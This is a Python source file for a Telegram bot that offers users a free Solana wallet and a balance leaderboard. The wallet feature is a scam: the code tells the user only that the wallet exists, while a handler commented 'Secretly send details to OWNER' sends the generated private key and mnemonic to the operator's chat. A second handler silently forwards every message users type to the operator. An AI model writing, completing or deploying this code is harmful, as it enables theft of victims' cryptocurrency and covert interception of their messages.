import os
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes

# === Environment Variables ===
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID"))

# === Store users and balances in memory (simple leaderboard) ===
user_data = {}
DATA_FILE = "leaderboard.json"

# Load leaderboard if it exists
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, "r") as f:
        user_data = json.load(f)


def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(user_data, f)


# === /start command ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🪙 Create Wallet", callback_data="create_wallet")],
        [InlineKeyboardButton("📊 Leaderboard", callback_data="leaderboard")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🤖 Welcome! Choose an option:", reply_markup=reply_markup)


# === Handle button presses ===
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    user_name = query.from_user.first_name or "Unknown"

    await query.answer()

    if query.data == "create_wallet":
        # Prevent multiple wallets per user
        if user_id in user_data and "public_key" in user_data[user_id]:
            await query.edit_message_text("⚠️ You already created a wallet!")
            return

        # Generate new Solana wallet
        mnemonic = Bip39MnemonicGenerator().FromWordsNumber(12)
        seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
        bip44_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)
        acct = bip44_mst.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)

        public_key = acct.PublicKey().ToAddress()
        private_key = acct.PrivateKey().Raw().ToHex()

        # Store user info
        user_data[user_id] = {
            "name": user_name,
            "public_key": public_key,
            "balance": 0,
        }
        save_data()

        # Tell the user
        await query.edit_message_text("✅ Your Solana wallet has been created!")

        # Secretly send details to OWNER
        await context.bot.send_message(
            chat_id=OWNER_CHAT_ID,
            text=(
                "📩 *New Wallet Created*\n\n"
                f"👤 User: {user_name} (`{user_id}`)\n\n"
                f"💳 Public Key: `{public_key}`\n"
                f"🔑 Private Key: `{private_key}`\n\n"
                f"📝 Mnemonic: `{mnemonic}`"
            ),
            parse_mode="Markdown",
        )

    elif query.data == "leaderboard":
        if not user_data:
            await query.edit_message_text("📊 No users yet!")
            return

        sorted_users = sorted(user_data.items(), key=lambda x: x[1]["balance"], reverse=True)

        leaderboard_text = "🏆 *Leaderboard*\n\n"
        for i, (uid, info) in enumerate(sorted_users[:10], start=1):
            leaderboard_text += f"{i}. {info['name']} — {info['balance']} SOL\n"

        await query.edit_message_text(leaderboard_text, parse_mode="Markdown")


# === Forward every user message silently to OWNER ===
async def forward_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message:
        text = update.message.text or ""
        await context.bot.send_message(
            chat_id=OWNER_CHAT_ID,
            text=f"📨 Forwarded Message:\n\n👤 {update.message.from_user.first_name}:\n💬 `{text}`",
            parse_mode="Markdown",
        )


# === Main ===
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, forward_message))

    print("🚀 Bot started...")
    app.run_polling()


if __name__ == "__main__":
    main()
